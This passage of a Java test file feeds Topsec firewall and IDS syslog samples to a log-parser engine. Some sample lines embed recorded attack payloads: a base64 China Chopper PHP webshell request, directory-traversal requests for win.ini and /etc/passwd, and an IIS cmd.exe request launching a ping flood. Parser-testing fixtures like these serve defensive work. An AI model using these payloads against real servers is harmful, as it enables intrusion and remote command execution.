      data = "vendor=\"topsec\" dev_type=\"3\" dev_name=\"TopsecOS\" dev_ip=\"172.21.6.244\" time=\"2020-09-04 10:21:03\" index=\"2521\" recorder=\"audit_http2\" sid=\"429277832834572845\" proto=\"2\" sip=\"192.167.1.212\" sport=\"56649\" dip=\"47.102.197.26\" dport=\"80\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"C8:1F:BE:37:33:AC\" dmac=\"00:0D:48:2A:17:4C\" method=\"POST\" scheme=\"http\" host=\"\" authority=\"47.102.197.26:80\" path=\"/xcloud.xnet.gateway.srv/Ping\" x_forwarded_for=\"\" user_agent=\"identity,deflate,gzip\" referer=\"\" accept_type=\"\" accept_encoding=\"identity,gzip\" accept_language=\"\" cookies=\"\" content_length_client=\"\" post_data=\"\" http_param=\"\" status_code=\"200\" server=\"envoy\" content_type=\"application/grpc\" content_length_server=\"\" content_encoding=\"\" set_cookie=\"\" range=\"\" location=\"\" authorization=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"4\" dev_name=\"\" dev_ip=\"192.168.113.101\" time=\"2019-09-18 11:29:56\" index=\"402\" recorder=\"audit_http\" sid=\"5d81a4b4002684f\" proto=\"2\" sip=\"10.10.10.1\" sport=\"180\" dip=\"10.10.10.2\" dport=\"80\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth0\" ddev=\"\" smac=\"00:04:23:C0:DD:81\" dmac=\"00:04:23:C0:DD:80\" http_protocol=\"HTTP/1.1\" method=\"GET\" host=\"10.2.8.235:8080\" uri=\"http://10.2.8.235:8080/jsp-examples/jsp2/simpletag/;repeat.jsp\" x_forwarded_for=\"\" user_agent=\"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.4) Gecko/20060508 Firefox/1.5.0.4\" referer=\"\" accept_type=\"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\" accept_encoding=\"gzip,deflate\" accept_language=\"en-us,en;q=0.5\" cookies=\"JSESSIONID=D06BCC5EE957CD795D5D459912C40FEC\" connection_client=\"keep-alive\" content_length_client=\"0\" post_data=\"\" http_param=\"\" status_code=\"200 OK\" server=\"Apache\" content_type=\"text/plain\" content_length_server=\"5\" content_encoding=\"\" set_cookie=\"\" connection_server=\"Keep-Alive\" range=\"\" location=\"\" authorization=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"\" dev_ip=\"192.168.239.135\" time=\"2019-11-01 13:31:15\" index=\"409\" recorder=\"audit_icmp\" sid=\"5dbbc3230002ae9\" proto=\"4\" sip=\"192.168.239.135\" sport=\"0\" dip=\"192.168.23.106\" dport=\"0\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"00:50:56:34:3E:DD\" dmac=\"00:50:56:EF:B5:C7\" request_type=\"8\" request_code=\"0\" request_payload=\"56\" reply_type=\"0\" reply_code=\"0\" reply_payload=\"56\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"3\" dev_name=\"TopsecOS\" dev_ip=\"172.21.6.244\" time=\"2020-09-04 14:35:40\" index=\"2527\" recorder=\"audit_ikev2\" sid=\"429280408472142468\" proto=\"3\" sip=\"172.21.3.142\" sport=\"500\" dip=\"192.167.1.112\" dport=\"500\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"00:0D:48:29:A5:77\" dmac=\"00:0D:48:2A:15:6D\" version=\"2.0\" spi=\"8383524602729688949\" role=\"initiator\" encryption=\"DES-IV64\" auth=\"HMAC-MD5-96\" prf=\"HMAC-MD5\" esn=\"\" dh=\"Modp768\" dh_data=\"iuQ2gsrSjkVvb+OtwicsGDf7psUCXzrtQKjRYitBQax61o6dybV0VgTjLvu5XTPnNUyfbzUaeFIl90hpiFZ/b3QAGnCp/nmzkOK4tDUL/rz8eR0KSXJgek52mEtEj6qYrfptalBJ4+ZIPSN+Edw8EamYLL8YtS6nfsy8IfUvvyDfC0wfsYb4nH8I6O/Z9+5yaCxDX1QJbOKpDyD6jFBnFqWSbDR35GNBWUTT3122iKkZ6WxBulsSFtqS5C0G\"";
      parse(botuEngine, data);
      data = "vendor=\"天融信\" dev_type=\"1\" dev_name=\"ids_1\" dev_ip=\"192.168.23.1\" time=\"2018-07-06 13:30:30\" index=\"203\" recorder=\"interface\" interface=\"feth0\" op=\"up\" speed=\"1000 mbps\" duplex=\"full duplex\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"TopsecOS\" dev_ip=\"172.17.23.75\" time=\"2020-04-21 11:08:56\" index=\"301\" recorder=\"ipsipbw\" type=\"24\" sub_type=\"\" level=\"3\" sid=\"426124787289571171\" proto=\"4\" sip=\"20.20.0.2\" sport=\"0\" dip=\"2.7.102.1\" dport=\"0\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth51\" ddev=\"\" smac=\"01:1A:C5:01:00:00\" dmac=\"01:1A:C5:02:00:00\" op=\"2\" rule=\"0\" msg=\"static black source ip 20.20.20.2\" repeat=\"1\" cve=\"\" app_pro=\"0\" app=\"Others\" method=\"\" appendix=\"\" fingerprint=\"\" request=\"\" response_code=\"\" response=\"\" file=\"\" client=\"\" server=\"\" sgeo=\"Unknown\" dgeo=\"Unknown\" result=\"0\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"TopsecOS\" dev_ip=\"192.168.204.111\" time=\"2020-01-10 07:54:20\" index=\"416\" recorder=\"audit_ldap\" sid=\"423755985044111606\" proto=\"2\" sip=\"181.1.1.1\" sport=\"36587\" dip=\"181.1.1.2\" dport=\"389\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"28:51:32:10:5E:A9\" dmac=\"00:0C:29:C1:EF:19\" username=\"user11234567890qwertyuiop1234567890qwertyuiop1234567890qwert\" password=\"\" version=\"3\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"TopTVD\" dev_ip=\"192.168.138.250\" time=\"2020-08-26 19:20:16\" index=\"2524\" recorder=\"audit_modbus\" sid=\"429078189332053057\" proto=\"2\" sip=\"21.1.1.3\" sport=\"50632\" dip=\"21.1.1.7\" dport=\"502\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"00:0C:29:69:8C:97\" dmac=\"00:50:56:85:8B:B8\" transaction_id=\"57\" protocol_id=\"0\" unit_id=\"100\" function=\"Write Multiple Coils(15)\" function_category=\"Public Assigned\" result=\"Failure, Illegal Function(1)\" sub_function=\"\" mei=\"\" address=\"\" quantity=\"10\" count=\"2\" write_data=\"1c 00 \"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"3\" dev_name=\"TopsecOS\" dev_ip=\"172.21.6.244\" time=\"2020-09-04 10:20:32\" index=\"2520\" recorder=\"audit_mqtt\" sid=\"429277815656603320\" proto=\"2\" sip=\"192.167.2.22\" sport=\"62065\" dip=\"223.252.199.69\" dport=\"6004\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"00:0D:48:2A:15:6D\" dmac=\"00:0D:48:2A:17:4C\" username=\"\" password=\"\" version=\"v3.1\" topic=\"note.youdao.com/reconnect2\" topicmsg=\"eyJicm9hZGNhc3QiOiJub3RlLnlvdWRhby5jb206MCIsImRldmljZUlkIjoibm90ZS55b3VkYW8uY29tLUVBNDcwRTQ4LUU0QUItNDkwQy1CMjk2LTEyNzU4OTVDRTgzQiIsInVzZXJzIjoibm90ZS55b3VkYW8uY29tOnh1d3V5dWFuamlhbkAxNjMuY29tOjA6S1hsaFdGNnFsQ2hoek1DWlVmRmRsQnczdnNvPSJ9Cg==\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"4\" dev_name=\"\" dev_ip=\"192.168.113.101\" time=\"2019-09-18 11:38:50\" index=\"412\" recorder=\"audit_nfs\" sid=\"5d81a6ca0026855\" proto=\"2\" sip=\"192.168.113.5\" sport=\"781\" dip=\"192.168.113.3\" dport=\"2049\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth0\" ddev=\"\" smac=\"00:0C:29:05:DF:E8\" dmac=\"00:0C:29:20:09:CE\" nfs_version=\"0\" operation=\"1\" result=\"0\" nfs_proc=\"compound\" nfs_op=\"read\" file_name=\"SecureCRTPortable.exe\" file_size=\"68836\" deal_size=\"68836\"";
      parse(botuEngine, data);
      data = "vendor=\"天融信\" dev_type=\"1\" dev_name=\"ids_1\" dev_ip=\"192.168.23.1\" time=\"2018-07-06 13:30:30\" index=\"204\" recorder=\"pf\" src=\"172.18.16.185\" dst=\"172.18.16.161\" sport=\"62137\" dport=\"443\" proto=\"6\" smac=\"00:50:56:86:44:6e\" dmac=\"00:90:0b:2d:5c:90\" sdev=\"feth0\" op=\"permit\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"TopsecOS\" dev_ip=\"192.168.204.111\" time=\"2020-01-10 07:53:45\" index=\"417\" recorder=\"audit_rdp\" sid=\"423755975380435122\" proto=\"2\" sip=\"192.168.41.1\" sport=\"47410\" dip=\"192.168.41.146\" dport=\"3389\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"00:50:56:C0:00:08\" dmac=\"00:0C:29:25:F9:34\" username=\"liuludan\" password=\"123456\"";
      parse(botuEngine, data);
      data = "vendor=\"天融信\" dev_type=\"1\" dev_name=\"ids_1\" dev_ip=\"192.168.23.1\" time=\" 2018-07-06 13:30:30\" index=\"209\" recorder=\"recover\" msg=\"the process of 'telnetd' is being started by the tos_recoverd process, please wait ...\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"TopsecOS\" dev_ip=\"172.18.14.165\" time=\"2020-02-20 17:21:54\" index=\"2105\" recorder=\"rules_update\" op=\"hanaaaupdate\" msg=\"ips rules-update hand-update failed\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"TopsecOS\" dev_ip=\"172.18.14.240\" time=\"2020-02-20 17:56:00\" index=\"2540\" recorder=\"securitypolicy\" policyid=\"40836\" proto=\"TCP\" sdev=\"feth14\" src=\"1.2.0.2\" sport=\"55808\" dst=\"1.2.0.7\" dport=\"6666\" action=\"permit\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"3\" dev_name=\"TopsecOS\" dev_ip=\"172.21.6.244\" time=\"2020-09-04 14:35:43\" index=\"2526\" recorder=\"audit_sip\" sid=\"429280425652021018\" proto=\"3\" sip=\"172.21.3.142\" sport=\"5060\" dip=\"192.167.1.112\" dport=\"5060\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"00:0D:48:29:A5:77\" dmac=\"00:0D:48:2A:15:6D\" response_code=\"\" cseq_num=\"63104\" version=\"SIP/2.0\" method=\"OPTIONS\" uri=\"sip:192.167.1.112\" sip_from=\"GizaNE <sip:172.21.3.142:5060>;tag=1299086864\" sip_to=\"<sip:172.21.3.142:5060>\" call_id=\"479216977\" cseq_name=\"OPTIONS\" authorization=\"\" content_type=\"\" content_encoding=\"\" user_agent=\"\" server=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"4\" dev_name=\"\" dev_ip=\"192.168.113.101\" time=\"2019-09-18 11:51:39\" index=\"412\" recorder=\"audit_smb\" sid=\"5d81a9cb0000001\" proto=\"2\" sip=\"192.168.23.158\" sport=\"51247\" dip=\"192.168.23.69\" dport=\"445\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth0\" ddev=\"\" smac=\"10:60:4B:6A:71:D7\" dmac=\"64:51:06:5A:55:91\" smb_version=\"2\" operation=\"0\" result=\"0\" smb_cmd=\"write\" user_name=\"topsec\" host_name=\"10232-SSG\" session_id=\"4398046511149\" tree_id=\"9\" file_name=\"CVE__2013-4123__CVE 2013-4123 __1.1.181.233.pcap\" file_size=\"3691\" deal_size=\"3691\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"3\" dev_name=\"TopsecOS\" dev_ip=\"172.21.6.244\" time=\"2020-09-04 10:16:16\" index=\"2528\" recorder=\"audit_snmp\" sid=\"429277790958617978\" proto=\"3\" sip=\"192.167.73.21\" sport=\"58333\" dip=\"192.167.1.254\" dport=\"161\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"00:0D:48:2A:17:4C\" dmac=\"00:0D:48:2A:15:6D\" version=\"v1\" community=\"cHVibGlj\" pdu_type=\"snmp_get_request (0xa0)\" requestid=\"30082\" errorstatus=\"noError (0)\" errorindex=\"0\" enterprise=\"\" agent_addr=\"\" generic_trap=\"\" msg_id=\"\" msg_max_size=\"\" auth_engine_boots=\"\" auth_engine_time=\"\" username=\"\" variable_binding=\"b2JqZWN0X25hbWU6MS4zLjYuMS4yLjEuMjUuMy4yLjEuNS4xLHZhbHVlOgpvYmplY3RfbmFtZToxLjMuNi4xLjIuMS4yNS4zLjUuMS4xLjEsdmFsdWU6Cm9iamVjdF9uYW1lOjEuMy42LjEuMi4xLjI1LjMuNS4xLjIuMSx2YWx1ZToK\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"3\" dev_name=\"TopsecOS\" dev_ip=\"172.21.6.244\" time=\"2020-09-04 10:16:16\" index=\"2519\" recorder=\"audit_db\" sid=\"429277778879566021\" proto=\"2\" sip=\"192.167.72.223\" sport=\"60121\" dip=\"172.21.104.235\" dport=\"3306\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"C8:1F:BE:37:33:AE\" dmac=\"00:0D:48:29:A5:77\" dbtype=\"mysql\" version=\"5.7.22-22-57\" username=\"root\" password=\"\" dbname=\"tsccustomer\" command=\"SHOW WARNINGS\" retcode=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"4\" dev_name=\"\" dev_ip=\"192.168.113.101\" time=\"2019-09-18 11:32:28\" index=\"401\" recorder=\"audit_tdp\" sid=\"5d81a5380026851\" proto=\"2\" sip=\"12.1.1.2\" sport=\"54454\" dip=\"12.1.1.100\" dport=\"54656\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth0\" ddev=\"\" smac=\"00:0C:29:05:1C:67\" dmac=\"00:0C:29:DC:86:60\" first_time=\"1568777528634\" last_time=\"1568777528635\" up_pkts=\"9\" down_pkts=\"4\" up_bytes=\"6642\" down_bytes=\"228\" alert_flag=\"0\" tcp_flag=\"27\" tcp_end_type=\"1\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"TopsecOS\" dev_ip=\"192.168.90.144\" time=\"2020-08-27 11:28:45\" index=\"2529\" recorder=\"audit_tftp\" sid=\"429093787847885011\" proto=\"3\" sip=\"192.168.23.32\" sport=\"58009\" dip=\"192.168.23.1\" dport=\"69\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"84:A9:3E:82:79:ED\" dmac=\"00:0E:C6:61:5A:B0\" file_name=\"damn_iris3603.exe\" transfer_type=\"octet\" operation=\"0\" tftp_result=\"transfer success\" tsize_option=\"76356\" blksize_option=\"512\" timeout_option=\"\" err_code=\"\" err_msg=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"TopsecOS\" dev_ip=\"172.17.23.75\" time=\"2020-04-21 11:08:55\" index=\"301\" recorder=\"tvdevent\" type=\"19\" sub_type=\"1901\" level=\"1\" sid=\"426124787018992195\" proto=\"2\" sip=\"fde0:6477:1e3f::1:f8\" sport=\"36020\" dip=\"fde0:6477:1e3f::2:c\" dport=\"80\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth51\" ddev=\"\" smac=\"02:1A:C5:01:00:00\" dmac=\"02:1A:C5:02:00:00\" op=\"1\" rule=\"1505\" msg=\"一句话php木马(eval)通过菜刀连接\" repeat=\"1\" cve=\"\" app_pro=\"1\" app=\"HTTP\" method=\"POST\" appendix=\"(URL=http://192.168.4.39/php/1.php)\" fingerprint=\"\" request=\"JmdvYWNlPUBldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpOyZ6MD1RR2x1YVY5elpYUW9JbVJwYzNCc1lYbGZaWEp5YjNKeklpd2lNQ0lwTzBCelpYUmZkR2x0WlY5c2FXMXBkQ2d3S1R0QWMyVjBYMjFoWjJsalgzRjFiM1JsYzE5eWRXNTBhVzFsS0RBcE8yVmphRzhvSWkwJTJCZkNJcE96c2taajFpWVhObE5qUmZaR1ZqYjJSbEtDUmZVRTlUVkZzaWVqRWlYU2s3SkdNOUpGOVFUMU5VV3lKNk1pSmRPeVJqUFhOMGNsOXlaWEJzWVdObEtDSmNjaUlzSWlJc0pHTXBPeVJqUFhOMGNsOXlaWEJzWVdObEtDSmNiaUlzSWlJc0pHTXBPeVJpZFdZOUlpSTdabTl5S0NScFBUQTdKR2s4YzNSeWJHVnVLQ1JqS1Rza2FTczlNaWtrWW5WbUxqMTFjbXhrWldOdlpHVW9JaVVpTG5O\" response_code=\"\" response=\"\" file=\"Event1505.20200421_110855670625.74549827.pcap\" client=\",Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\" server=\"\" sgeo=\"Unknown\" dgeo=\"Unknown\" result=\"2\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"TopsecOS\" dev_ip=\"192.168.11.240\" time=\"2020-08-26 15:07:21\" index=\"2530\" recorder=\"audit_xmpp\" sid=\"429074112334266563\" proto=\"2\" sip=\"192.168.1.9\" sport=\"4369\" dip=\"173.194.72.125\" dport=\"5222\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"10:60:4B:6E:9B:52\" dmac=\"08:10:77:37:B5:12\" msg_type=\"message\" username=\"\" operation_type=\"chat\" operation_id=\"72\" msg_from=\"topsec0001@gmail.com/Talk.v10512550200\" msg_to=\"topsec0002@gmail.com\" xmlns=\"http://jabber.org/protocol/chatstates\" xml_lang=\"\" version=\"\" name=\"\" jid=\"\" subsciption=\"\" xmpp_group=\"\" mechanism=\"\" token=\"\" node=\"\" stamp=\"\" resource=\"\" host=\"\" msg_body=\"dkaokfldjfodjf;sodjfpos\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"4\" dev_name=\"\" dev_ip=\"192.168.113.101\" time=\"2019-09-18 11:32:08\" index=\"404\" recorder=\"audit_file\" sid=\"5d81a5380026851\" proto=\"2\" sip=\"12.1.1.2\" sport=\"54454\" dip=\"12.1.1.100\" dport=\"54656\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth0\" ddev=\"\" smac=\"00:0C:29:05:1C:67\" dmac=\"00:0C:29:DC:86:60\" application=\"FTP\" file=\"04--csrss.exe\" filesize=\"104470784514048\" filetype=\"EXE\" md5=\"342271f6142e7c70805b8a81e1ba5f5c\" direction=\"s2c\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"4\" dev_name=\"\" dev_ip=\"192.168.113.101\" time=\"2019-09-18 11:55:17\" index=\"403\" recorder=\"audit_mail\" sid=\"5d81aaa50000002\" proto=\"2\" sip=\"1.2.0.4\" sport=\"56987\" dip=\"1.2.0.7\" dport=\"143\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth0\" ddev=\"\" smac=\"00:50:56:86:2B:BE\" dmac=\"00:50:56:86:6E:0A\" application=\"IMAP\" sender=\"3@test.com\" receiver=\"3@test.com\" subject=\"UPX\" file=\"\" cc=\"\" bcc=\"\" x_mailer=\"Foxmail 7, 2, 7, 26[cn]\" mail_id=\"201702091816343906301@test.com\"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"2\" dev_name=\"Topsec\" dev_ip=\"10.146.202.80\" time=\"2022-09-09 11:29:16\" index=\"301\" recorder=\"attack\" type=\"1\" sub_type=\"105\" level=\"1\" sid=\"631ab30b0078db8\" proto=\"2\" sip=\"10.146.202.76\" sport=\"44168\" dip=\"10.146.202.129\" dport=\"80\" sipv6=\"\" dipv6=\"\" vid=\"200\" sdev=\"feth2\" ddev=\"\" smac=\"48:7B:6B:94:3B:E6\" dmac=\"00:00:5E:00:01:C8\" op=\"2\" rule=\"12196\" msg=\"3Com���糬���û�Ŀ¼��������\" repeat=\"1\" cve=\"CVE-2005-2020\" app_pro=\"1\" app=\"HTTP\" method=\"GET\" appendix=\"http://10.146.202.129/../../../../../../../../../../../../windows/win.ini\" response_code=\"\" file=\"\" client=\",Mozilla/5.0 [en] (X11, U; TopVAS 1.0.0)\" server=\"\" sgeo=\"Private IP\" dgeo=\"Private IP\" result=\"0\" x_forwarded_for=\"\" x_real_ip=\"\" direction=\"c2s\" fingerprint=\"0,474554202E2E2F2E2E2F#\" req_header=\"R0VUIC4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL3dpbmRvd3Mvd2luLmluaSBIVFRQLzEuMVxyXG5Ib3N0OiAxMC4xNDYuMjAyLjEyOVxyXG5BY2NlcHQ6IGltYWdlL2dpZiwgaW1hZ2UveC14Yml0bWFwLCBpbWFnZS9qcGVnLCBpbWFnZS9wanBlZywgaW1hZ2UvcG5nLCAqLypcclxuQWNjZXB0LUxhbmd1YWdlOiBlblxyXG5Db25uZWN0aW9uOiBLZWVwLUFsaXZlXHJcbkFjY2VwdC1DaGFyc2V0OiBpc28tODg1OS0xLHV0Zi04O3E9MC45LCo7cT0wLjFcclxuVXNlci1BZ2VudDogTW96aWxsYS81LjAgW2VuXSAoWDExLCBVOyBUb3BWQVMgMS4wLjApXHJcblByYWdtYTogbm8tY2FjaGVcclxu\" req_body=\"\" resp_header=\"\" resp_body=\"\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  //天融信入侵检测
  public void testIdsTopsecTopsentry() {
    String parserFile = "./resources/parsers/ids_topsec_topsentry[3.3.005.662u]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "id=tos time=\"2008-5-14 06:53:10\" fw=TopsecOS pri=4 type=ips recorder=IPSEVENT proto=tcp src=192.168.1.2 sport=20 dst=192.168.2.2 dport=40 rule=1125 repeat=10 msg=\"WEB-MISC Netscape Enterprise Server directory view\" appendix=\"(URL=http://ZDxnRwrmbye/sc ripts/../..%c1%9c../../winnt/system3 2/cmd.exe?/c%20ping.exe%20-v%20igmp% 20-t%20-l%2065000%20185.49.78.89%20- n%207000%20-w%200)\" application=HTTP op=\"block\" interface=  sdev=eth10  ddev=eth11";
      parse(botuEngine, data);
      data = "id=tos time=\"2008-5-14 06:53:10\" fw=TopsecOS pri=6 type=ips recorder=IPSAR proto=tcp src=192.168.3.2 sport=80 dst=192.168.2.2 dport=69000 rule=  repeat=  msg= appendix= application=\"qq\" op=\"block\" interface=  sdev=eth10 ddev=eth11";
      parse(botuEngine, data);
      data = "id=tos time=\"2008-5-14 06:53:10\" fw=TopsecOS pri=6 type=ips recorder=IPSAV proto=tcp src=192.168.1.2 sport=20 dst=192.168.2.2 dport=40 rule=11125 repeat=1 msg=\"AB2FAF21.VIR\" appendix= application=HTTP op=\"block\" interface=  sdev=eth10 ddev=eth11";
      parse(botuEngine, data);
      data = "id=tos time=\"2008-5-14 06:53:10\" fw=TopsecOS pri=6 type=ips recorder=IPSURL proto=tcp src=192.168.1.2 sport=20 dst=192.168.2.2 dport=40 rule=11125 repeat=1 msg=\"Stock\" appendix=\"www.163.com\" application=HTTP op=\"block\" interface=  sdev=eth10 ddev=eth11";
      parse(botuEngine, data);
      data = "id=tos time=\"2018-09-25 14:38:51\" fw=IDP  pri=5 type=mgmt user=superman src=192.168.28.7 op=\"log log type_set add conn\" result=0 recorder=config msg=\"null\"";
      parse(botuEngine, data);
      data = "id=tos time=\"2018-09-25 14:39:00\" fw=IDP pri=6 type=ips recorder=IPSFLOW_IP ip=\"192.168.128.75\" application=\"SSL\" sent=488 rcvd=650 session=0 stat_time=1537857540 interface=";
      parse(botuEngine, data);
      data = "id=tos time=\"2008-5-14 06:53:10\" fw=TopsecOS pri=6 type=ips recorder=IPSFLOW_AR application=\"qq\" is_group=\"0\" sent=3333 rcvd=213123 session=43434 stat_time=1249450200 interface = sdev=eth10 ddev=eth11";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2294.10163_TVS.1\" time=\"2022-08-03 11:30:51\" dev=\"TopsecOS\" pri=\"  Ϣ\" type=\"©    Ϣ  ־\" recorder=\"topvas\" index=\"2493\" vsid=\"0\" srcIPv4=\"192.168.1.254\" srcIPv6=\"fe80::290:bff:fe84:c684\" srcPort=\"0\" dstIPv4=\"172.26.83.233\" dstIPv6=\"null\" dstPort=\"135\" dstDomainName=\"\" scanID=\"  ʱ        \" scanType=\"ϵͳɨ  \" VulnName=\"DCE / RPC  MSRPC    ö ٱ   \" VulnType=\"3\" TVID=\"TVID-201700-48347\" VulnCost=\"5\" VulnRepair=\"   ˵  ˶˿ڵĴ         \" VulnDesc=\"    ͨ   ڶ˿ 135     Ӳ ִ   ʵ  Ĳ ѯ  ö    Զ           еķֲ ʽ   㻷  /Զ ̹  ̵  ã DCE / RPC    MSRPC    \"";
      parse(botuEngine, data);
      data = "vendor=\"Topsec\" dev_type=\"2\" dev_name=\"Topsec\" dev_ip=\"10.146.202.80\" time=\"2022-09-09 11:29:23\" index=\"301\" recorder=\"attack\" type=\"1\" sub_type=\"105\" level=\"1\" sid=\"631ab31301833c7\" proto=\"2\" sip=\"10.146.202.76\" sport=\"57673\" dip=\"10.146.202.4\" dport=\"8080\" sipv6=\"\" dipv6=\"\" vid=\"100\" sdev=\"feth2\" ddev=\"\" smac=\"48:7B:6B:94:3B:EB\" dmac=\"48:7B:6B:6B:60:C6\" op=\"2\" rule=\"12196\" msg=\"3Com���糬���û�Ŀ¼�����\" repeat=\"1\" cve=\"CVE-2005-2020\" app_pro=\"1\" app=\"HTTP\" method=\"GET\" appendix=\"http://10.146.202.4:8080/../../../../../../../../../../../../etc/passwd\" response_code=\"\" file=\"\" client=\",Mozilla/5.0 [en] (X11, U; TopVAS 1.0.0)\" server=\"\" sgeo=\"Private IP\" dgeo=\"Private IP\" result=\"0\" x_forwarded_for=\"\" x_real_ip=\"\" direction=\"c2s\" fingerprint=\"0,474554202E2E2F2E2E2F#\" req_header=\"R0VUIC4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QgSFRUUC8xLjFcclxuSG9zdDogMTAuMTQ2LjIwMi40OjgwODBcclxuQWNjZXB0OiBpbWFnZS9naWYsIGltYWdlL3gteGJpdG1hcCwgaW1hZ2UvanBlZywgaW1hZ2UvcGpwZWcsIGltYWdlL3BuZywgKi8qXHJcbkFjY2VwdC1MYW5ndWFnZTogZW5cclxuQ29va2llOiBKU0VTU0lPTklEPUFEMzQxNzU0M0U0ODQwOTI5RTkzMjk5OUZFQkZENUYwXHJcbkNvbm5lY3Rpb246IENsb3NlXHJcbkFjY2VwdC1DaGFyc2V0OiBpc28tODg1OS0xLHV0Zi04O3E9MC45LCo7cT0wLjFcclxuVXNlci1BZ2VudDogTW96aWxsYS81LjAgW2VuXSAoWDExLCBVOyBUb3BWQVMgMS4wLjApXHJcblByYWdtYTogbm8tY2FjaGVcclxu\" req_body=\"\" resp_header=\"\" resp_body=\"\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  //360Eps
  public void testEps360() {
    String parserFile = "./resources/parsers/eps_360_skylar_warn.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      // 漏洞
      String data = "<6>{\"version\":\"\\u5929\\u64ce6.3.0.5100\",\"log_name\":\"\\u6f0f\\u6d1e\\u7ba1\\u7406\",\"log_id\":\"8 fd61e0dec7f71dee4e6d52261c0ed1d\",\"create_time\":\"2017-06-08 09:46:26\",\"ip\":\"10.74.121.88\",\"report_ip\":\"18.10.169.10\",\"mac\":\"aae3ccde4830\",\"gid\":1,\"work_ group\":\"workgroup\",\"content\":{\"name\":\"windows uri \\u5904\\u7406\\u4e2d\\u7684\\u6f0f\\u6d1e\\u53ef\\u80fd\\u5141\\u8bb8\\u8fdc\\u7a0b\\u6267\\u884c\\u4ee3\\u7801\",\"type\":\"\\u9ad8\\u5371\\u6f0f\\u6d1e\",\"action\":\"\\u6f0f\\u6d1e\\u5df2\\u7ecf\\u8fc7\\u671f\"}}";
      parse(botuEngine, data);
      // 体检
